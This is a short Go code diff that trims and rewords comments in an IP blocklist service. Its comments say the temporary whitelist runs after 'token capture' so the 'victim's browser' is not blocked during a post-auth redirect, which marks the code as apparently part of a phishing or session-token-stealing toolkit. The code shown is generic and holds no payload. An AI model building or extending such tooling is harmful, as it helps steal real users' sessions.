@@ -22,7 +22,6 @@ func NewBlacklistService(bus EventBus) *BlacklistService {
 	}
 }
 
-// IsBlocked returns true if ip is on the blocklist and not temporarily whitelisted.
 func (s *BlacklistService) IsBlocked(ip string) bool {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -33,29 +32,27 @@ func (s *BlacklistService) IsBlocked(ip string) bool {
 	return blocked
 }
 
-// Block adds ip to the blocklist.
 func (s *BlacklistService) Block(ip string) {
 	s.mu.Lock()
 	s.blocked[ip] = struct{}{}
 	s.mu.Unlock()
 }
 
-// Unblock removes ip from the blocklist.
 func (s *BlacklistService) Unblock(ip string) {
 	s.mu.Lock()
 	delete(s.blocked, ip)
 	s.mu.Unlock()
 }
 
-// WhitelistTemporary exempts ip from blocking for dur. Used after successful
-// token capture so the victim's real browser isn't blocked on the next request.
+// WhitelistTemporary temporarily exempts ip from blocking. Called after token
+// capture so the victim's browser isn't blocked during the post-auth redirect.
 func (s *BlacklistService) WhitelistTemporary(ip string, dur time.Duration) {
 	s.mu.Lock()
 	s.whitelist[ip] = time.Now().Add(dur)
 	s.mu.Unlock()
 }
 
-// List returns all currently blocked IPs as a slice (unsorted).
+// List returns blocked IPs in unspecified order.
 func (s *BlacklistService) List() []string {
 	s.mu.Lock()
 	defer s.mu.Unlock()
